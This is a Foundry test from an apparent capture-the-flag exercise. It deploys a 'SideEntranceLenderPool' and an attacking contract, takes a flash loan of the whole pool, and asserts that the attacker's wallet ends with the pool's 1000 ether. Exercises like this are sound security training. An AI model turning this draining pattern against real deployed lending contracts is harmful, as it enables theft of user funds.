// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {IFlashLoanEtherReceiver, SideEntranceLenderPool} from "../src/SideEntranceLenderPool.sol";
import {AttackingContract} from "../src/AttackingContract.sol";

contract SideEntranceLenderTest is Test {

    SideEntranceLenderPool sideEntrancePool;
    AttackingContract attackingContract;

    uint256 public constant POOL_STARTING_BALANCE = 1000e18;
    uint256 public constant USER_STARTING_BALANCE = 1e18;

    address user = makeAddr("user");

    function setUp() external {
        sideEntrancePool = new SideEntranceLenderPool();
        attackingContract = new AttackingContract(address(sideEntrancePool));
        vm.deal(user, USER_STARTING_BALANCE);
        vm.deal(address(sideEntrancePool), POOL_STARTING_BALANCE);

        vm.prank(user);
        (bool sent, ) = payable(address(attackingContract)).call{value: USER_STARTING_BALANCE}("");
        require(sent, "Failed to send Ether");
    }

    function test_hack() public {
        attackingContract.flashLoan(1000e18);
        vm.prank(user);
        attackingContract.claimEth();
        assertEq(user.balance, 1001e18);
        assertEq(address(sideEntrancePool).balance, 0);
    }
    
}


